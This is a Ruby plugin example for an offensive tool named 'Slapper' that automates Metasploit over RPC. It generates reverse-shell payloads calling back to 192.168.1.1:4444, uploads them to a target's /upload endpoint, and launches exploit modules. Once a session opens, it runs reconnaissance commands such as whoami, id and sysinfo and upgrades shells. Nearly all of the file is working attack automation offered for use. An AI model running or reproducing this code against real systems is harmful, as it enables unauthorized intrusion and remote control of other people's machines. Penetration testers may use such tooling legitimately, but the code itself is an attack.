# Slapper Ruby Plugin Example - Metasploit Integration
#
# This example demonstrates how to create Ruby plugins that integrate
# with Metasploit for payload generation and execution.
#
# Requirements:
#   - Enable Ruby plugins: cargo build --features ruby-plugins
#   - Running Metasploit RPC server (msfrpcd)
#   - Copy this file to ~/.config/slapper/plugins/
#   - Run: ./slapper run-plugin metasploit_example --target http://target.com
#
# To start Metasploit RPC server:
#   msfrpcd -P password -U msf -f
#
# Or use docker:
#   docker run -d -p 55553:55553 -p 55554:55554 --name msf metasploitframework/metasploit-framework

module Slapper
  class Plugin
    NAME = "metasploit_example"
    VERSION = "1.0.0"
    AUTHOR = "Slapper Team"
    DESCRIPTION = "Metasploit integration example plugin"
    
    def run(target, config = {})
      results = []
      
      Slapper::Report.info("Metasploit Plugin", "Starting Metasploit integration...")
      
      msf_url = config['msf_url'] || "http://127.0.0.1:55553"
      msf_user = config['msf_user'] || "msf"
      msf_pass = config['msf_password'] || "password"
      
      unless Metasploit.connected?
        Slapper::Report.info("Metasploit", "Connecting to #{msf_url}...")
        
        success = Metasploit.connect(msf_url, msf_user, msf_pass)
        
        unless success
          Slapper::Report.error("Metasploit", "Failed to connect")
          return { success: false, error: "Failed to connect to Metasploit" }
        end
      end
      
      version = Metasploit.version
      Slapper::Report.info("Metasploit", "Connected to #{version}")
      
      results << { type: 'msf_version', data: version }
      
      payloads = config['payloads'] || default_payloads(target)
      
      payloads.each do |payload_config|
        payload_name = payload_config['name']
        options = payload_config['options'] || []
        
        Slapper::Report.info("Payload", "Generating #{payload_name}...")
        
        begin
          encoded = Metasploit.generate_payload(payload_name, options)
          
          results << {
            type: 'payload',
            name: payload_name,
            encoded: encoded,
            options: options
          }
          
          Slapper::Report.success("Payload", "Generated #{payload_name} (#{encoded.length} bytes)")
          
          if config['test_delivery']
            test_payload_delivery(target, encoded, payload_config)
          end
          
        rescue => e
          Slapper::Report.error("Payload", "Failed to generate #{payload_name}: #{e.message}")
        end
      end
      
      if config['list_modules']
        list_available_modules
      end
      
      if config['execute_exploit']
        execute_exploit(config)
      end
      
      if config['maintain_session'] && config['maintain_session']
        manage_sessions(config)
      end
      
      Slapper::Report.success("Metasploit Plugin", "Completed successfully")
      
      {
        success: true,
        target: target,
        results: results
      }
    end
    
    def default_payloads(target)
      if target.include?('windows')
        [
          { name: 'windows/meterpreter/reverse_tcp', options: ['LHOST=192.168.1.1', 'LPORT=4444'] }
        ]
      elsif target.include?('linux')
        [
          { name: 'linux/x86/shell_reverse_tcp', options: ['LHOST=192.168.1.1', 'LPORT=4444'] }
        ]
      else
        [
          { name: 'generic/shell_reverse_tcp', options: ['LHOST=192.168.1.1', 'LPORT=4444'] }
        ]
      end
    end
    
    def list_available_modules
      Slapper::Report.info("Modules", "Listing available modules...")
      
      ['exploit', 'auxiliary', 'payload', 'encoder'].each do |type|
        begin
          modules = Metasploit.list_modules(type)
          Slapper::Report.info("Modules", "#{type}: #{modules.count} modules available")
        rescue => e
          Slapper::Report.warning("Modules", "Failed to list #{type}: #{e.message}")
        end
      end
    end
    
    def execute_exploit(config)
      exploit_name = config['exploit_name']
      exploit_options = config['exploit_options'] || []
      
      unless exploit_name
        Slapper::Report.warning("Exploit", "No exploit specified, skipping execution")
        return
      end
      
      Slapper::Report.info("Exploit", "Executing #{exploit_name}...")
      
      begin
        result = Metasploit.execute_module('exploit', exploit_name, exploit_options)
        
        if result['success']
          uuid = result['uuid']
          Slapper::Report.success("Exploit", "Exploit started (UUID: #{uuid})")
          
          wait_for_session(config['wait_timeout'] || 30)
        else
          Slapper::Report.error("Exploit", "Exploit failed: #{result['message']}")
        end
      rescue => e
        Slapper::Report.error("Exploit", "Error: #{e.message}")
      end
    end
    
    def wait_for_session(timeout)
      Slapper::Report.info("Session", "Waiting for session...")
      
      start_time = Time.now
      
      while Time.now - start_time < timeout
        sessions = Metasploit.list_sessions
        
        if sessions.any?
          session = sessions.first
          session_id = session['id']
          
          Slapper::Report.success("Session", "Session established: #{session_id}")
          
          interact_with_session(session_id)
          return
        end
        
        sleep 1
      end
      
      Slapper::Report.warning("Session", "No session established within timeout")
    end
    
    def interact_with_session(session_id)
      Slapper::Report.info("Session", "Interacting with session #{session_id}...")
      
      begin
        info = Metasploit.session_info(session_id)
        Slapper::Report.info("Session", "Type: #{info['type']}, Target: #{info['target']}")
        
        if info['type'].include?('meterpreter')
          interact_meterpreter(session_id)
        else
          interact_shell(session_id)
        end
      rescue => e
        Slapper::Report.error("Session", "Error: #{e.message}")
      end
    end
    
    def interact_meterpreter(session_id)
      Slapper::Report.info("Meterpreter", "Meterpreter session detected")
      
      commands = ['sysinfo', 'getuid', 'pwd']
      
      commands.each do |cmd|
        begin
          output = Metasploit.session_shell_write(session_id, "#{cmd}\n")
          sleep 0.5
          response = Metasploit.session_shell_read(session_id)
          Slapper::Report.info("Meterpreter[#{cmd}]", response)
        rescue => e
          Slapper::Report.warning("Meterpreter", "Command failed: #{e.message}")
        end
      end
    end
    
    def interact_shell(session_id)
      Slapper::Report.info("Shell", "Shell session detected")
      
      commands = ['whoami', 'uname -a', 'id']
      
      commands.each do |cmd|
        begin
          output = Metasploit.session_shell_write(session_id, "#{cmd}\n")
          sleep 0.5
          response = Metasploit.session_shell_read(session_id)
          Slapper::Report.info("Shell[#{cmd}]", response)
        rescue => e
          Slapper::Report.warning("Shell", "Command failed: #{e.message}")
        end
      end
    end
    
    def manage_sessions(config)
      Slapper::Report.info("Sessions", "Managing sessions...")
      
      sessions = Metasploit.list_sessions
      
      Slapper::Report.info("Sessions", "Active sessions: #{sessions.count}")
      
      sessions.each do |session|
        session_id = session['id']
        
        if config['upgrade_shells']
          lhost = config['lhost'] || '192.168.1.1'
          lport = config['lport'] || 4444
          
          begin
            Slapper::Session.shell_upgrade(session_id, lhost, lport)
            Slapper::Report.success("Upgrade", "Shell upgrade initiated for #{session_id}")
          rescue => e
            Slapper::Report.warning("Upgrade", "Failed: #{e.message}")
          end
        end
      end
    end
    
    def test_payload_delivery(target, encoded_payload, payload_config)
      Slapper::Report.info("Delivery", "Testing payload delivery...")
      
      upload_endpoint = "#{target}/upload"
      
      begin
        response = Slapper::HTTP.post(upload_endpoint, encoded_payload)
        
        if response['status'] == 200
          Slapper::Report.success("Delivery", "Payload delivered successfully")
        else
          Slapper::Report.warning("Delivery", "Delivery failed (HTTP #{response['status']})")
        end
      rescue => e
        Slapper::Report.warning("Delivery", "Delivery error: #{e.message}")
      end
    end
  end
end
